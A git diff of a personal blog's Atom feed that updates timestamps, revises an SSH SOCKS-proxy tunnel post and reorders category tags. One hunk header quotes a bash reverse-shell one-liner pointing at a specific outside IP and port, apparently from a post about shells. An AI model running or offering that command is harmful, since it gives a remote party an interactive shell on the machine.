@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.virzz.com/"/>
-  <updated>2016-12-25T07:41:12.000Z</updated>
+  <updated>2016-12-27T13:00:30.000Z</updated>
   <id>https://www.virzz.com/</id>
   
   <author>
@@ -20,24 +20,24 @@
     <link href="https://www.virzz.com/2016/12/25/SSH%E4%BB%A3%E7%90%86%E8%BD%89socks5.html"/>
     <id>https://www.virzz.com/2016/12/25/SSH代理轉socks5.html</id>
     <published>2016-12-25T07:19:25.000Z</published>
-    <updated>2016-12-25T07:41:12.000Z</updated>
+    <updated>2016-12-27T13:00:30.000Z</updated>
     
     <summary type="html">
     
       &lt;h2&gt;Set up the SSH tunnel&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;ssh -D 1080 -f -C -q -N user@hostname.ca
+&lt;pre&gt;&lt;code&gt;ssh -D 1080 -f -C -q -N user@host
+ssh -qTfnN -D 7070 -p 22 user@host
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2&gt;Set up System Preferences&lt;/h2&gt;
-&lt;p&gt;This 
+&lt;h2&gt;Set up Syst
     
     </summary>
     
     
       <category term="mac" scheme="https://www.virzz.com/tags/mac/"/>
     
-      <category term="ssh" scheme="https://www.virzz.com/tags/ssh/"/>
-    
       <category term="socks" scheme="https://www.virzz.com/tags/socks/"/>
+    
+      <category term="ssh" scheme="https://www.virzz.com/tags/ssh/"/>
     
   </entry>
   
@@ -85,9 +85,9 @@
     
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
-      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
+    
+      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
     
   </entry>
   
@@ -156,9 +156,9 @@ ssh-keygen -t
     </summary>
     
     
-      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
+    
+      <category term="web" scheme="https://www.virzz.com/tags/web/"/>
     
       <category term="python" scheme="https://www.virzz.com/tags/python/"/>
     
@@ -211,9 +211,9 @@ wget http://public-yum.oracle.com/public-yum-ol6.repo
     
       <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
-      <category term="linux" scheme="https://www.virzz.com/tags/linux/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
+    
+      <category term="linux" scheme="https://www.virzz.com/tags/linux/"/>
     
   </entry>
   
@@ -351,9 +351,9 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     </summary>
     
     
-      <category term="shell" scheme="https://www.virzz.com/tags/shell/"/>
-    
       <category term="linux" scheme="https://www.virzz.com/tags/linux/"/>
+    
+      <category term="shell" scheme="https://www.virzz.com/tags/shell/"/>
     
   </entry>
   
